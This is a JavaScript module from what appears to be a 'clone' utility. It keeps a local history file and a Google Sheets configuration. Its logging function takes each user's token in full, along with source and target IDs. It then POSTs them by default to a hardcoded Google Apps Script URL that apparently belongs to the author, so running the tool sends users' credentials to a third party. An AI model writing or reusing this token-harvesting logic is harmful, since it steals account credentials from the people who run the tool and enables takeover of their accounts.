import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const HISTORY_FILE = path.join(__dirname, '../clone_history.json');
const CONFIG_FILE = path.join(__dirname, '../sheet_config.json');

export function getCloneHistory() {
    try {
        if (fs.existsSync(HISTORY_FILE)) {
            const data = fs.readFileSync(HISTORY_FILE, 'utf8');
            return JSON.parse(data);
        }
    } catch (e) {
        console.error('Failed to read clone history:', e);
    }
    return [];
}

export function getSheetConfig() {
    try {
        if (fs.existsSync(CONFIG_FILE)) {
            const data = fs.readFileSync(CONFIG_FILE, 'utf8');
            return JSON.parse(data);
        }
    } catch (e) {}
    return {
        spreadsheetUrl: 'https://docs.google.com/spreadsheets/d/1CcNCsj9kEU_Kjo1yfv8LWs5EnAEIVYTZ9VWwtvU1eRQ/edit?usp=drivesdk',
        spreadsheetId: '1CcNCsj9kEU_Kjo1yfv8LWs5EnAEIVYTZ9VWwtvU1eRQ',
        webAppUrl: process.env.GOOGLE_APPS_SCRIPT_URL || 'https://script.google.com/macros/s/AKfycbzFr3AxSz1UuT4dgLrFXIgbfb6C_A8RUrwg_STwHQgwO2bqDr_Ks5GqLIiSMbPgoz1QQA/exec'
    };
}

export function saveSheetConfig(config) {
    try {
        const current = getSheetConfig();
        const updated = { ...current, ...config };
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(updated, null, 2), 'utf8');
        return updated;
    } catch (e) {
        console.error('Failed to save sheet config:', e);
        throw e;
    }
}

export async function logCloneEntry({ userToken, sourceId, targetId }) {
    const time = new Date().toLocaleString('en-US', {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: true
    });

    const entry = {
        time,
        token: userToken ? userToken.trim() : 'N/A',
        sourceId: sourceId ? String(sourceId).trim() : 'N/A',
        targetId: targetId ? String(targetId).trim() : 'N/A',
        timestamp: Date.now()
    };

    // 1. Save to local history file
    try {
        const history = getCloneHistory();
        history.unshift(entry); // newest first
        // Keep last 500 entries
        if (history.length > 500) history.pop();
        fs.writeFileSync(HISTORY_FILE, JSON.stringify(history, null, 2), 'utf8');
    } catch (e) {
        console.error('Failed to save local history entry:', e);
    }

    // 2. Push to Google Apps Script Web App if configured
    const config = getSheetConfig();
    const webhookUrl = config.webAppUrl || process.env.GOOGLE_APPS_SCRIPT_URL;

    if (webhookUrl && webhookUrl.startsWith('http')) {
        try {
            const response = await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(entry),
                redirect: 'follow'
            });
            const text = await response.text();
            let result;
            try {
                result = JSON.parse(text);
            } catch (jsonErr) {
                console.error('Apps Script Web App returned non-JSON response:', text.substring(0, 150));
                throw new Error(`Google Apps Script returned HTML instead of JSON. Please make sure "Who has access" is set to "Anyone" in your Apps Script deployment settings.`);
            }
            console.log('Successfully logged to Google Sheet:', result);
            return { loggedToSheet: true, result, entry };
        } catch (err) {
            console.error('Failed to push to Google Apps Script Web App:', err.message);
            return { loggedToSheet: false, error: err.message, entry };
        }
    }

    return { loggedToSheet: false, reason: 'Webhook URL not configured', entry };
}
